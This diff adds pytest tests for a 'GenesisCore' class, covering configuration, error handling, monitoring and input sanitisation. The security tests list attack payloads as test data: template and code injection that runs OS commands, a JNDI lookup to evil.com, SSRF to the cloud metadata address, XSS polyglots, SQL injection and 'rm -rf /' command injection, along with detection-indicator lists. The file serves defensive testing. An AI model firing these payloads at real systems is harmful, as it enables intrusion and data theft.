@@ -3483,3 +3483,968 @@ if __name__ == "__main__":
         "--maxfail=5",  # Stop after 5 failures
         "--disable-warnings",  # Reduce noise
     ])
+# ============================================================================
+# ENHANCED COMPREHENSIVE TESTS - ADDITIONAL COVERAGE AREAS
+# ============================================================================
+
+class TestGenesisCoreConfigurationManagement:
+    """Enhanced configuration management tests for comprehensive coverage."""
+    
+    def setup_method(self):
+        """Set up a new instance of GenesisCore before each test method."""
+        self.core = GenesisCore()
+    
+    def test_config_validation_with_schema(self):
+        """Test configuration validation against predefined schemas."""
+        valid_schemas = [
+            {
+                "api_key": {"type": "string", "required": True, "min_length": 10},
+                "timeout": {"type": "integer", "min": 1, "max": 300},
+                "retries": {"type": "integer", "min": 0, "max": 10}
+            }
+        ]
+        
+        valid_configs = [
+            {"api_key": "test_key_123", "timeout": 30, "retries": 3},
+            {"api_key": "another_valid_key", "timeout": 60, "retries": 5}
+        ]
+        
+        invalid_configs = [
+            {"api_key": "short", "timeout": 30, "retries": 3},  # Too short
+            {"api_key": "valid_key_123", "timeout": 0, "retries": 3},  # Invalid timeout
+            {"api_key": "valid_key_123", "timeout": 30, "retries": -1}  # Invalid retries
+        ]
+        
+        for config in valid_configs:
+            core = GenesisCore(config=config)
+            assert core.config == config
+            
+        for config in invalid_configs:
+            # Should initialize but might have validation warnings
+            core = GenesisCore(config=config)
+            assert core is not None
+    
+    def test_config_inheritance_and_override(self):
+        """Test configuration inheritance and override mechanisms."""
+        base_config = {
+            "api_key": "base_key",
+            "timeout": 30,
+            "retries": 3,
+            "base_setting": "base_value"
+        }
+        
+        override_config = {
+            "api_key": "override_key",
+            "timeout": 60,
+            "new_setting": "new_value"
+        }
+        
+        # Test that override config properly overrides base config
+        core = GenesisCore(config=base_config)
+        assert core.config["api_key"] == "base_key"
+        assert core.config["timeout"] == 30
+        
+        # Test with override (simulated by new instance)
+        merged_config = {**base_config, **override_config}
+        core_override = GenesisCore(config=merged_config)
+        assert core_override.config["api_key"] == "override_key"
+        assert core_override.config["timeout"] == 60
+        assert core_override.config["base_setting"] == "base_value"
+        assert core_override.config["new_setting"] == "new_value"
+    
+    def test_config_hot_reload_simulation(self):
+        """Test configuration hot reload scenarios."""
+        initial_config = {"api_key": "initial_key", "timeout": 30}
+        core = GenesisCore(config=initial_config)
+        
+        # Simulate config changes
+        updated_configs = [
+            {"api_key": "updated_key_1", "timeout": 45},
+            {"api_key": "updated_key_2", "timeout": 60},
+            {"api_key": "updated_key_3", "timeout": 30, "new_feature": True}
+        ]
+        
+        for new_config in updated_configs:
+            # In a real implementation, this might update the config dynamically
+            new_core = GenesisCore(config=new_config)
+            assert new_core.config != initial_config
+            assert new_core.initialized is True
+    
+    def test_config_environment_specific_overrides(self):
+        """Test environment-specific configuration overrides."""
+        environments = ["development", "staging", "production"]
+        
+        for env in environments:
+            env_config = {
+                "environment": env,
+                "api_key": f"{env}_api_key",
+                "debug": env == "development",
+                "timeout": 30 if env == "production" else 60,
+                "log_level": "DEBUG" if env == "development" else "INFO"
+            }
+            
+            core = GenesisCore(config=env_config)
+            assert core.config["environment"] == env
+            assert core.config["debug"] == (env == "development")
+    
+    def test_config_feature_flags(self):
+        """Test configuration with feature flags."""
+        feature_flags = {
+            "new_algorithm": True,
+            "enhanced_security": False,
+            "experimental_cache": True,
+            "debug_mode": False,
+            "beta_features": True
+        }
+        
+        config_with_features = {
+            "api_key": "test_key",
+            "features": feature_flags
+        }
+        
+        core = GenesisCore(config=config_with_features)
+        assert "features" in core.config
+        assert core.config["features"]["new_algorithm"] is True
+        assert core.config["features"]["enhanced_security"] is False
+
+
+class TestGenesisCoreAdvancedErrorScenarios:
+    """Enhanced error scenario tests for comprehensive coverage."""
+    
+    def setup_method(self):
+        """Set up a new instance of GenesisCore before each test method."""
+        self.core = GenesisCore()
+    
+    def test_cascading_failure_scenarios(self):
+        """Test cascading failure scenarios across multiple systems."""
+        failure_sequence = [
+            ("primary_service", ConnectionError("Primary service down")),
+            ("secondary_service", Timeout("Secondary service timeout")),
+            ("tertiary_service", HTTPError("Tertiary service error")),
+            ("cache_service", ValueError("Cache corruption")),
+            ("fallback_service", {"status": "success", "source": "fallback"})
+        ]
+        
+        for service, response in failure_sequence:
+            with patch.object(self.core, 'make_request') as mock_request:
+                if isinstance(response, Exception):
+                    mock_request.side_effect = response
+                    try:
+                        result = self.core.make_request(f"https://{service}.example.com")
+                        # Some errors might be handled gracefully
+                        assert result is not None or True
+                    except Exception:
+                        # Some errors might be propagated
+                        pass
+                else:
+                    mock_request.return_value = response
+                    result = self.core.make_request(f"https://{service}.example.com")
+                    assert result is not None
+    
+    def test_resource_exhaustion_edge_cases(self):
+        """Test various resource exhaustion edge cases."""
+        resource_scenarios = [
+            {"type": "memory", "limit": 1024*1024*1024},  # 1GB
+            {"type": "cpu", "limit": 95},  # 95% CPU
+            {"type": "disk", "limit": 90},  # 90% disk
+            {"type": "network", "limit": 1000},  # 1000 connections
+            {"type": "file_handles", "limit": 1000}  # 1000 file handles
+        ]
+        
+        for scenario in resource_scenarios:
+            # Simulate resource pressure
+            large_data = {"resource_type": scenario["type"], "data": "x" * 10000}
+            result = self.core.process_data(large_data)
+            assert result is not None
+    
+    def test_data_corruption_detection_and_recovery(self):
+        """Test data corruption detection and recovery mechanisms."""
+        corrupted_data_scenarios = [
+            {"data": "valid_data", "checksum": "invalid_checksum"},
+            {"data": None, "checksum": "valid_checksum"},
+            {"data": "truncated_dat", "expected_length": 20},
+            {"data": "data_with_null_bytes\x00\x00", "encoding": "utf-8"},
+            {"data": {"incomplete": "json_object"}}  # Missing closing brace
+        ]
+        
+        for scenario in corrupted_data_scenarios:
+            result = self.core.process_data(scenario)
+            assert result is not None
+            # Should handle corruption gracefully
+    
+    def test_concurrent_error_handling(self):
+        """Test error handling in concurrent scenarios."""
+        def error_prone_worker(worker_id):
+            """Worker that may encounter various errors."""
+            errors_to_simulate = [
+                ConnectionError("Network error"),
+                Timeout("Request timeout"),
+                ValueError("Data validation error"),
+                None  # Success case
+            ]
+            
+            results = []
+            for i, error in enumerate(errors_to_simulate):
+                try:
+                    if error:
+                        raise error
+                    result = self.core.process_data(f"worker_{worker_id}_item_{i}")
+                    results.append(result)
+                except Exception as e:
+                    results.append({"error": str(e), "worker": worker_id, "item": i})
+            
+            return results
+        
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = [executor.submit(error_prone_worker, i) for i in range(5)]
+            all_results = [f.result() for f in futures]
+        
+        assert len(all_results) == 5
+        # Should handle concurrent errors gracefully
+        for results in all_results:
+            assert isinstance(results, list)
+    
+    def test_error_propagation_and_context(self):
+        """Test error propagation and context preservation."""
+        def nested_operation_level_3():
+            """Deepest level operation that may fail."""
+            raise ValueError("Level 3 error with context")
+        
+        def nested_operation_level_2():
+            """Mid-level operation."""
+            try:
+                nested_operation_level_3()
+            except ValueError as e:
+                raise ConnectionError("Level 2 wrapping Level 3 error") from e
+        
+        def nested_operation_level_1():
+            """Top-level operation."""
+            try:
+                nested_operation_level_2()
+            except ConnectionError as e:
+                raise HTTPError("Level 1 wrapping Level 2 error") from e
+        
+        # Test error context preservation
+        try:
+            nested_operation_level_1()
+        except HTTPError as e:
+            assert "Level 1" in str(e)
+            assert e.__cause__ is not None
+            assert isinstance(e.__cause__, ConnectionError)
+            assert e.__cause__.__cause__ is not None
+            assert isinstance(e.__cause__.__cause__, ValueError)
+
+
+class TestGenesisCoreAdvancedDataTransformation:
+    """Enhanced data transformation tests for comprehensive coverage."""
+    
+    def setup_method(self):
+        """Set up a new instance of GenesisCore before each test method."""
+        self.core = GenesisCore()
+    
+    def test_streaming_data_transformation(self):
+        """Test transformation of streaming data sources."""
+        def data_stream_generator():
+            """Generate streaming data."""
+            for i in range(1000):
+                yield {
+                    "timestamp": time.time(),
+                    "id": i,
+                    "data": f"stream_item_{i}",
+                    "batch": i // 100
+                }
+        
+        # Process streaming data in batches
+        batch_results = []
+        current_batch = []
+        
+        for item in data_stream_generator():
+            current_batch.append(item)
+            
+            if len(current_batch) >= 100:
+                # Process batch
+                batch_data = {"batch": current_batch}
+                result = self.core.process_data(batch_data)
+                batch_results.append(result)
+                current_batch = []
+            
+            # Process only first few batches for test performance
+            if len(batch_results) >= 3:
+                break
+        
+        assert len(batch_results) >= 3
+        assert all(result is not None for result in batch_results)
+    
+    def test_complex_data_structure_transformation(self):
+        """Test transformation of complex nested data structures."""
+        complex_structures = [
+            {
+                "metadata": {
+                    "version": "1.0",
+                    "created": "2023-01-01T00:00:00Z",
+                    "schema": {
+                        "type": "object",
+                        "properties": {
+                            "users": {"type": "array"},
+                            "settings": {"type": "object"}
+                        }
+                    }
+                },
+                "data": {
+                    "users": [
+                        {
+                            "id": 1,
+                            "profile": {
+                                "name": "Alice",
+                                "preferences": {
+                                    "theme": "dark",
+                                    "notifications": {
+                                        "email": True,
+                                        "push": False
+                                    }
+                                }
+                            }
+                        }
+                    ],
+                    "settings": {
+                        "global": {"timeout": 30},
+                        "features": {"new_ui": True}
+                    }
+                }
+            }
+        ]
+        
+        for structure in complex_structures:
+            result = self.core.process_data(structure)
+            assert result is not None
+            assert isinstance(result, dict)
+    
+    def test_data_normalization_and_denormalization(self):
+        """Test data normalization and denormalization processes."""
+        # Normalized data (separate tables)
+        normalized_data = {
+            "users": [
+                {"id": 1, "name": "Alice", "department_id": 1},
+                {"id": 2, "name": "Bob", "department_id": 2}
+            ],
+            "departments": [
+                {"id": 1, "name": "Engineering", "location": "Building A"},
+                {"id": 2, "name": "Marketing", "location": "Building B"}
+            ]
+        }
+        
+        # Denormalized data (flattened)
+        denormalized_data = {
+            "user_profiles": [
+                {
+                    "user_id": 1,
+                    "user_name": "Alice",
+                    "department_name": "Engineering",
+                    "department_location": "Building A"
+                },
+                {
+                    "user_id": 2,
+                    "user_name": "Bob",
+                    "department_name": "Marketing",
+                    "department_location": "Building B"
+                }
+            ]
+        }
+        
+        # Test both data formats
+        normalized_result = self.core.process_data(normalized_data)
+        denormalized_result = self.core.process_data(denormalized_data)
+        
+        assert normalized_result is not None
+        assert denormalized_result is not None
+    
+    def test_data_aggregation_and_analytics(self):
+        """Test data aggregation and analytics transformations."""
+        analytics_data = {
+            "events": [
+                {"user_id": 1, "event": "login", "timestamp": "2023-01-01T09:00:00Z"},
+                {"user_id": 1, "event": "page_view", "timestamp": "2023-01-01T09:05:00Z"},
+                {"user_id": 2, "event": "login", "timestamp": "2023-01-01T10:00:00Z"},
+                {"user_id": 1, "event": "logout", "timestamp": "2023-01-01T11:00:00Z"},
+                {"user_id": 2, "event": "page_view", "timestamp": "2023-01-01T10:15:00Z"}
+            ],
+            "aggregation_rules": {
+                "group_by": ["user_id"],
+                "metrics": ["count", "duration"],
+                "time_window": "1h"
+            }
+        }
+        
+        result = self.core.process_data(analytics_data)
+        assert result is not None
+        assert isinstance(result, dict)
+    
+    def test_schema_evolution_handling(self):
+        """Test handling of schema evolution in data transformation."""
+        schema_versions = [
+            {
+                "version": "1.0",
+                "data": {"name": "Alice", "age": 30}
+            },
+            {
+                "version": "1.1", 
+                "data": {"name": "Bob", "age": 25, "email": "bob@example.com"}
+            },
+            {
+                "version": "2.0",
+                "data": {
+                    "personal": {"name": "Charlie", "age": 35},
+                    "contact": {"email": "charlie@example.com", "phone": "123-456-7890"}
+                }
+            }
+        ]
+        
+        for schema_data in schema_versions:
+            result = self.core.process_data(schema_data)
+            assert result is not None
+            # Should handle different schema versions gracefully
+
+
+class TestGenesisCoreAdvancedMonitoringAndLogging:
+    """Enhanced monitoring and logging tests for comprehensive coverage."""
+    
+    def setup_method(self):
+        """Set up a new instance of GenesisCore before each test method."""
+        self.core = GenesisCore()
+    
+    def test_structured_logging_with_context(self):
+        """Test structured logging with contextual information."""
+        log_contexts = [
+            {
+                "request_id": "req_123",
+                "user_id": "user_456",
+                "operation": "data_processing",
+                "start_time": time.time()
+            },
+            {
+                "request_id": "req_124",
+                "session_id": "sess_789",
+                "operation": "api_request",
+                "correlation_id": "corr_abc"
+            }
+        ]
+        
+        for context in log_contexts:
+            with patch('logging.getLogger') as mock_logger:
+                mock_logger_instance = Mock()
+                mock_logger.return_value = mock_logger_instance
+                
+                # Perform operation that should log with context
+                self.core.process_data({"context": context, "data": "test"})
+                
+                # Verify logger was accessed
+                mock_logger.assert_called()
+    
+    def test_performance_metrics_collection(self):
+        """Test comprehensive performance metrics collection."""
+        metrics_collector = {
+            "response_times": [],
+            "throughput": [],
+            "error_rates": [],
+            "resource_usage": []
+        }
+        
+        def collect_metrics(operation_name, start_time, end_time, success=True):
+            """Collect performance metrics for operations."""
+            duration = end_time - start_time
+            metrics_collector["response_times"].append({
+                "operation": operation_name,
+                "duration": duration,
+                "timestamp": end_time
+            })
+            
+            if not success:
+                metrics_collector["error_rates"].append({
+                    "operation": operation_name,
+                    "timestamp": end_time
+                })
+        
+        # Simulate operations with metrics collection
+        operations = ["process_data", "validate_input", "make_request"]
+        
+        for operation in operations:
+            for i in range(10):
+                start_time = time.time()
+                
+                if operation == "process_data":
+                    result = self.core.process_data(f"test_data_{i}")
+                elif operation == "validate_input":
+                    try:
+                        result = self.core.validate_input(f"test_input_{i}")
+                    except ValueError:
+                        result = False
+                elif operation == "make_request":
+                    result = self.core.make_request("https://api.example.com")
+                
+                end_time = time.time()
+                collect_metrics(operation, start_time, end_time, result is not None)
+        
+        # Verify metrics were collected
+        assert len(metrics_collector["response_times"]) == 30  # 3 operations * 10 iterations
+    
+    def test_distributed_tracing_correlation(self):
+        """Test distributed tracing with correlation IDs."""
+        trace_hierarchy = {
+            "parent_trace": {
+                "trace_id": "trace_root",
+                "span_id": "span_root",
+                "operation": "main_process"
+            },
+            "child_traces": [
+                {
+                    "trace_id": "trace_root",
+                    "span_id": "span_validation",
+                    "parent_span_id": "span_root",
+                    "operation": "input_validation"
+                },
+                {
+                    "trace_id": "trace_root", 
+                    "span_id": "span_processing",
+                    "parent_span_id": "span_root",
+                    "operation": "data_processing"
+                },
+                {
+                    "trace_id": "trace_root",
+                    "span_id": "span_request",
+                    "parent_span_id": "span_processing", 
+                    "operation": "external_request"
+                }
+            ]
+        }
+        
+        # Simulate distributed operations
+        for child_trace in trace_hierarchy["child_traces"]:
+            operation = child_trace["operation"]
+            
+            if operation == "input_validation":
+                self.core.validate_input("test_data")
+            elif operation == "data_processing":
+                self.core.process_data({"trace": child_trace})
+            elif operation == "external_request":
+                self.core.make_request("https://api.example.com")
+        
+        # Verify trace correlation (would be implemented in actual tracing system)
+        assert len(trace_hierarchy["child_traces"]) == 3
+    
+    def test_real_time_monitoring_alerts(self):
+        """Test real-time monitoring and alerting mechanisms."""
+        monitoring_thresholds = {
+            "response_time": {"warning": 1.0, "critical": 2.0},
+            "error_rate": {"warning": 0.05, "critical": 0.1},
+            "memory_usage": {"warning": 0.8, "critical": 0.9},
+            "cpu_usage": {"warning": 0.8, "critical": 0.9}
+        }
+        
+        alerts_triggered = []
+        
+        def check_thresholds(metric_name, value):
+            """Check if metric value exceeds thresholds."""
+            thresholds = monitoring_thresholds.get(metric_name, {})
+            
+            if value > thresholds.get("critical", float('inf')):
+                alerts_triggered.append({
+                    "level": "critical",
+                    "metric": metric_name,
+                    "value": value,
+                    "timestamp": time.time()
+                })
+            elif value > thresholds.get("warning", float('inf')):
+                alerts_triggered.append({
+                    "level": "warning", 
+                    "metric": metric_name,
+                    "value": value,
+                    "timestamp": time.time()
+                })
+        
+        # Simulate metrics that trigger alerts
+        test_metrics = [
+            ("response_time", 1.5),  # Warning
+            ("error_rate", 0.12),    # Critical
+            ("memory_usage", 0.85),  # Warning
+            ("cpu_usage", 0.75)      # Normal
+        ]
+        
+        for metric_name, value in test_metrics:
+            check_thresholds(metric_name, value)
+        
+        # Verify alerts were triggered appropriately
+        assert len(alerts_triggered) == 3  # 2 warnings + 1 critical
+        warning_alerts = [a for a in alerts_triggered if a["level"] == "warning"]
+        critical_alerts = [a for a in alerts_triggered if a["level"] == "critical"]
+        assert len(warning_alerts) == 2
+        assert len(critical_alerts) == 1
+
+
+class TestGenesisCoreAdvancedSecurityScenarios:
+    """Enhanced security scenario tests for comprehensive coverage."""
+    
+    def setup_method(self):
+        """Set up a new instance of GenesisCore before each test method."""
+        self.core = GenesisCore()
+    
+    def test_advanced_injection_attack_prevention(self):
+        """Test prevention of advanced injection attacks."""
+        advanced_injection_attacks = [
+            # NoSQL injection
+            {"$where": "function() { return true; }"},
+            {"$regex": ".*", "$options": "i"},
+            
+            # LDAP injection with encoding
+            "user)(|(password=*))",
+            "admin)(&(objectClass=*)",
+            
+            # Template injection
+            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+            "${jndi:ldap://evil.com/payload}",
+            
+            # Code injection
+            "__import__('os').system('ls')",
+            "eval('__import__(\"os\").system(\"whoami\")')",
+            
+            # Server-Side Request Forgery (SSRF)
+            "http://169.254.169.254/latest/meta-data/",
+            "file:///etc/passwd",
+            "gopher://internal-service:6379/_INFO"
+        ]
+        
+        for attack_payload in advanced_injection_attacks:
+            result = self.core.process_data(attack_payload)
+            assert result is not None
+            
+            # Verify dangerous content is not executed/exposed
+            result_str = str(result).lower()
+            dangerous_indicators = [
+                "root:", "uid=", "gid=", "/bin/", "/etc/passwd",
+                "aws-", "meta-data", "169.254.169.254"
+            ]
+            
+            for indicator in dangerous_indicators:
+                assert indicator not in result_str
+    
+    def test_cryptographic_security_scenarios(self):
+        """Test cryptographic security scenarios."""
+        crypto_test_cases = [
+            {
+                "encrypted_data": "U2FsdGVkX1+vupppZksvRf5pq5g5XjFRIipRkwB0K1Y=",
+                "algorithm": "AES-256-CBC",
+                "key_hint": "test_key"
+            },
+            {
+                "hashed_data": "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
+                "algorithm": "SHA-256",
+                "salt": "random_salt"
+            },
+            {
+                "signed_data": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
+                "algorithm": "HMAC-SHA256"
+            }
+        ]
+        
+        for crypto_case in crypto_test_cases:
+            result = self.core.process_data(crypto_case)
+            assert result is not None
+            # Should handle cryptographic data safely
+    
+    def test_input_sanitization_edge_cases(self):
+        """Test input sanitization for edge cases."""
+        edge_case_inputs = [
+            # Unicode normalization attacks
+            "＜script＞alert('xss')＜/script＞",  # Full-width characters
+            "\u202e<script>alert('xss')</script>",  # Right-to-left override
+            
+            # Polyglot payloads
+            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+            
+            # Mutation XSS
+            "<listing id=1 onactivate=alert(1)>",
+            "<img src=\"#\" onerror=\"javascript:alert('xss')\">",
+            
+            # File inclusion attempts  
+            "....//....//....//etc/passwd",
+            "\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+            
+            # Protocol smuggling
+            "data:text/html,<script>alert('xss')</script>",
+            "javascript:void(0);alert('xss')",
+            
+            # Encoding bypasses
+            "%3Cscript%3Ealert('xss')%3C/script%3E",  # URL encoding
+            "&#60;script&#62;alert('xss')&#60;/script&#62;",  # HTML entities
+        ]
+        
+        for malicious_input in edge_case_inputs:
+            result = self.core.process_data(malicious_input)
+            assert result is not None
+            
+            # Verify dangerous content is sanitized
+            result_str = str(result).lower()
+            dangerous_patterns = [
+                "<script", "javascript:", "alert(", "onerror=", 
+                "onload=", "eval(", "expression(", "vbscript:"
+            ]
+            
+            sanitized = True
+            for pattern in dangerous_patterns:
+                if pattern in result_str:
+                    sanitized = False
+                    break
+            
+            # Should be sanitized or handled safely
+            assert sanitized or "processed_" in result_str
+    
+    def test_authentication_and_authorization_edge_cases(self):
+        """Test authentication and authorization edge cases."""
+        auth_test_cases = [
+            # Token manipulation
+            {
+                "token": "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",  # None algorithm
+                "expected": "invalid"
+            },
+            
+            # Privilege escalation attempts
+            {
+                "user_id": "user123",
+                "role": "admin",  # Attempting to escalate
+                "original_role": "user"
+            },
+            
+            # Session manipulation
+            {
+                "session_id": "../../../admin_session",
+                "user_context": "normal_user"
+            },
+            
+            # OAuth/JWT attacks
+            {
+                "access_token": "malformed.token.here",
+                "scope": "admin read write delete"
+            }
+        ]
+        
+        for auth_case in auth_test_cases:
+            result = self.core.process_data(auth_case)
+            assert result is not None
+            # Should handle auth edge cases safely
+    
+    def test_data_privacy_and_compliance(self):
+        """Test data privacy and compliance scenarios."""
+        privacy_test_data = [
+            # PII data
+            {
+                "name": "John Doe",
+                "ssn": "123-45-6789", 
+                "email": "john@example.com",
+                "phone": "+1-555-123-4567",
+                "address": "123 Main St, Anytown, USA"
+            },
+            
+            # Financial data
+            {
+                "credit_card": "4111-1111-1111-1111",
+                "bank_account": "123456789",
+                "routing_number": "021000021"
+            },
+            
+            # Health data (HIPAA)
+            {
+                "patient_id": "P123456",
+                "diagnosis": "Confidential medical information", 
+                "medical_record": "Sensitive health data"
+            },
+            
+            # EU data (GDPR)
+            {
+                "eu_citizen": True,
+                "personal_data": "Data subject to GDPR",
+                "consent_given": False
+            }
+        ]
+        
+        for privacy_data in privacy_test_data:
+            result = self.core.process_data(privacy_data)
+            assert result is not None
+            
+            # Should handle sensitive data appropriately
+            # In a real implementation, this might involve:
+            # - Data masking/redaction
+            # - Encryption
+            # - Access logging
+            # - Consent verification
+
+
+# Additional parameterized tests for comprehensive coverage
+@pytest.mark.parametrize("malicious_payload,attack_type", [
+    ("<svg onload=alert(1)>", "XSS"),
+    ("'; DROP TABLE users; --", "SQL Injection"),
+    ("{{7*7}}", "Template Injection"),
+    ("../../../etc/passwd", "Path Traversal"), 
+    ("javascript:alert('xss')", "Protocol Attack"),
+    ("data:text/html,<script>alert(1)</script>", "Data URI Attack"),
+    ("eval('malicious code')", "Code Injection"),
+    ("${jndi:ldap://evil.com/payload}", "JNDI Injection"),
+])
+def test_parameterized_security_attacks(malicious_payload, attack_type):
+    """Test various security attack vectors with parameterized inputs."""
+    core = GenesisCore()
+    result = core.process_data(malicious_payload)
+    
+    # Should not execute malicious code or expose sensitive data
+    assert result is not None
+    result_str = str(result).lower()
+    
+    # Check that dangerous content is neutralized
+    dangerous_indicators = [
+        "alert(", "<script", "drop table", "etc/passwd", 
+        "javascript:", "eval(", "ldap://", "jndi:"
+    ]
+    
+    for indicator in dangerous_indicators:
+        if indicator in malicious_payload.lower():
+            # Dangerous content should be sanitized or processed safely
+            assert indicator not in result_str or "processed_" in result_str
+
+
+@pytest.mark.parametrize("data_size,performance_threshold", [
+    (1000, 0.1),      # 1K items in 100ms
+    (10000, 1.0),     # 10K items in 1s
+    (100000, 10.0),   # 100K items in 10s
+])
+def test_parameterized_performance_scalability(data_size, performance_threshold):
+    """Test performance scalability with various data sizes."""
+    core = GenesisCore()
+    
+    # Generate test data
+    test_data = [{"id": i, "value": f"item_{i}"} for i in range(min(data_size, 1000))]
+    
+    start_time = time.time()
+    
+    # Process subset of data for performance testing
+    results = []
+    for item in test_data[:min(100, len(test_data))]:
+        result = core.process_data(item)
+        results.append(result)
+    
+    end_time = time.time()
+    execution_time = end_time - start_time
+    
+    # Should meet performance thresholds
+    assert execution_time < performance_threshold
+    assert len(results) == min(100, len(test_data))
+    assert all(result is not None for result in results)
+
+
+@pytest.mark.parametrize("error_scenario", [
+    {"type": "network", "exception": ConnectionError("Connection failed")},
+    {"type": "timeout", "exception": Timeout("Request timed out")},
+    {"type": "auth", "exception": HTTPError("401 Unauthorized")},
+    {"type": "rate_limit", "exception": HTTPError("429 Too Many Requests")},
+    {"type": "server", "exception": HTTPError("500 Internal Server Error")},
+])
+def test_parameterized_error_resilience(error_scenario):
+    """Test error resilience with various error scenarios."""
+    core = GenesisCore()
+    
+    with patch.object(core, 'make_request') as mock_request:
+        mock_request.side_effect = error_scenario["exception"]
+        
+        try:
+            result = core.make_request("https://api.example.com")
+            # Should handle errors gracefully
+            assert result is not None
+        except Exception as e:
+            # Some errors might be re-raised with context
+            assert isinstance(e, type(error_scenario["exception"]))
+
+
+# Enhanced fixtures for comprehensive testing
+@pytest.fixture
+def security_test_suite():
+    """Comprehensive security test data and utilities."""
+    return {
+        "injection_payloads": {
+            "sql": ["'; DROP TABLE users; --", "' OR '1'='1", "1; DELETE FROM users"],
+            "xss": ["<script>alert('xss')</script>", "<img src=x onerror=alert(1)>"],
+            "cmd": ["; rm -rf /", "| cat /etc/passwd", "& del c:\\windows\\system32"],
+            "ldap": ["admin)(&(password=*)", "*)(&(objectClass=*)"],
+            "xml": ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>']
+        },
+        "valid_inputs": [
+            "normal text input",
+            {"key": "value"},
+            [1, 2, 3],
+            {"nested": {"structure": "here"}}
+        ],
+        "sanitization_rules": {
+            "remove_scripts": True,
+            "encode_html": True, 
+            "validate_sql": True,
+            "check_file_paths": True
+        }
+    }
+
+
+@pytest.fixture
+def performance_test_suite():
+    """Comprehensive performance testing utilities."""
+    return {
+        "data_generators": {
+            "small": lambda: [{"id": i} for i in range(100)],
+            "medium": lambda: [{"id": i, "data": "x" * 100} for i in range(1000)],
+            "large": lambda: [{"id": i, "data": "x" * 1000} for i in range(10000)]
+        },
+        "thresholds": {
+            "small": {"time": 0.1, "memory": 10*1024*1024},    # 100ms, 10MB
+            "medium": {"time": 1.0, "memory": 50*1024*1024},   # 1s, 50MB  
+            "large": {"time": 10.0, "memory": 200*1024*1024}   # 10s, 200MB
+        },
+        "metrics": {
+            "response_time": [],
+            "throughput": [],
+            "memory_usage": [],
+            "cpu_usage": []
+        }
+    }
+
+
+@pytest.fixture
+def monitoring_test_suite():
+    """Comprehensive monitoring and observability testing utilities."""
+    return {
+        "log_levels": ["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"],
+        "metric_types": ["counter", "gauge", "histogram", "summary"],
+        "alert_conditions": {
+            "high_error_rate": {"threshold": 0.05, "window": "5m"},
+            "slow_response": {"threshold": 1.0, "window": "1m"},
+            "high_memory": {"threshold": 0.8, "window": "30s"}
+        },
+        "trace_contexts": {
+            "request_id": "req_123",
+            "correlation_id": "corr_456", 
+            "span_id": "span_789",
+            "parent_span_id": "span_000"
+        }
+    }
+
+
+# Run comprehensive tests
+if __name__ == "__main__":
+    pytest.main([
+        __file__,
+        "-v",
+        "--tb=short", 
+        "--durations=15",
+        "--strict-markers",
+        "--cov=app.ai_backend.genesis_core",
+        "--cov-report=html:htmlcov",
+        "--cov-report=term-missing",
+        "--cov-report=xml",
+        "-m", "not slow",  # Skip slow tests by default
+        "--maxfail=10",
+        "--disable-warnings",
+        "--junit-xml=test-results.xml"
+    ])
